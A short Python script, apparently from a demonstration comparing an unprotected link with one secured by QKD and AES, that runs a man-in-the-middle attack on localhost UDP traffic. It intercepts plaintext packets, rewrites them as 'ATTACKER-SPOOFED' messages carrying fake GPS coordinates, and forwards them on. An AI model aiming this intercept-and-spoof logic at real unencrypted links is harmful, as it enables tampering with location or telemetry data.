import socket

MITM_LISTEN_IP = "127.0.0.1"
MITM_LISTEN_PORT = 14700

RECEIVER_IP = "127.0.0.1"
RECEIVER_PORT = 14602

BUFFER_SIZE = 65535

receive_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
receive_socket.bind((MITM_LISTEN_IP, MITM_LISTEN_PORT))

forward_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("=" * 65)
print("MITM ATTACK SIMULATION — WITHOUT QKD + AES")
print("=" * 65)
print(f"Intercepting plaintext : {MITM_LISTEN_IP}:{MITM_LISTEN_PORT}")
print(f"Forwarding modified    : {RECEIVER_IP}:{RECEIVER_PORT}")
print("Attack type            : Intercept, modify and forward")
print("Status                 : RUNNING")
print("=" * 65)

packet_count = 0

try:
    while True:
        original_data, source_address = receive_socket.recvfrom(BUFFER_SIZE)
        packet_count += 1

        original_text = original_data.decode("utf-8", errors="replace")

        modified_text = (
            f"ATTACKER-SPOOFED | Original={original_text} | "
            f"GPS=51.5074,-0.1278"
        )
        modified_data = modified_text.encode("utf-8")

        forward_socket.sendto(
            modified_data,
            (RECEIVER_IP, RECEIVER_PORT),
        )

        print(f"\n[MITM #{packet_count}]")
        print(f"Source   : {source_address}")
        print(f"Original : {original_text}")
        print(f"Modified : {modified_text}")
        print("Forwarded: YES")

except KeyboardInterrupt:
    print("\n" + "=" * 65)
    print("MITM simulation stopped")
    print(f"Packets modified: {packet_count}")
    print("=" * 65)

finally:
    receive_socket.close()
    forward_socket.close()
